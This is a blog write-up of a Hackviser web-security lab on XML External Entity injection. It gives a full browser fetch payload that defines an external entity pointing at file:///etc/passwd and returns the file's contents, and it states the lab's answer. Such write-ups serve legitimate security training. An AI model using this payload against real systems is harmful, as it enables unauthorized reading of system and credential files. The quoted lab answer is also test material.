---
title: 'XML External Entity Injection (XXE)'
date: '2026-03-01'
excerpt: 'Practice XML External Entity Injection (XXE) attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">XML External Entity Injection (XXE)</h1>
<div class="writeup-date">April 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice XML External Entity (XXE) attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Basic XXE</strong></h5>
<p class="mb-3">This lab contains a XML External Entity Injection (XXE) vulnerability that leads to unauthorized access to local files within the system. To complete the lab, exploit the XXE vulnerability in the contact form on the web page and access the contents of the /etc/passwd file. What is the username of the last user added in /etc/passwd?</p>
<p class="mb-3">The web app contains the contact form shown below.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image1.png" alt="Web Application Security XXE 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Reading the source code shows how the JavaScript function <code>submitForm()</code> manually constructs an XML string using template literals and sends it to contact.php with the header <code>Content-type: application/xml</code>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image2.png" alt="Web Application Security XXE 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">For lazy people like me who wants to solve this lab without using a web proxy like Burp Suite, first open Network Tab in the browser's Developer Tools. Then fill in dummy data and click Submit. Once the POST request is sent to contact.php, right click the request, select 'Copy' then 'Copy as fetch'. The request should look similar to the following:</p>

```javascript
fetch("https://engaging-spot.europe1.hackviser.space/contact.php", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en,en-US;q=0.9,de;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/xml",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Google Chrome\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://engaging-spot.europe1.hackviser.space/",
  "body": "\n            <contact>\n                <firstName>firstname</firstName>\n                <lastName>lastname</lastName>\n                <email>email@address.com</email>\n                <message>mymessage</message>\n            </contact>",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image3.png" alt="Web Application Security XXE 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now in the browser console, paste the payload below which has been modified.</p>

```javascript
fetch("https://engaging-spot.europe1.hackviser.space/contact.php", {
  "headers": {
    "content-type": "application/xml"
  },
  "body": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY exploit SYSTEM "file:///etc/passwd">
]>
<contact>
    <firstName>firstname</firstName>
    <lastName>lastname</lastName>
    <email>email@address.com</email>
    <message>&exploit;</message>
</contact>`,
  "method": "POST"
})
.then(response => response.text())
.then(data => console.log(data))
.catch(err => console.error('Error:', err));
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_xxe/xxe_hackviser_image4.png" alt="Web Application Security XXE 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We can now see the username of the last added user in /etc/passwd.</p>
<p class="mb-5"><strong>Answer:</strong> optimus</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">April 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>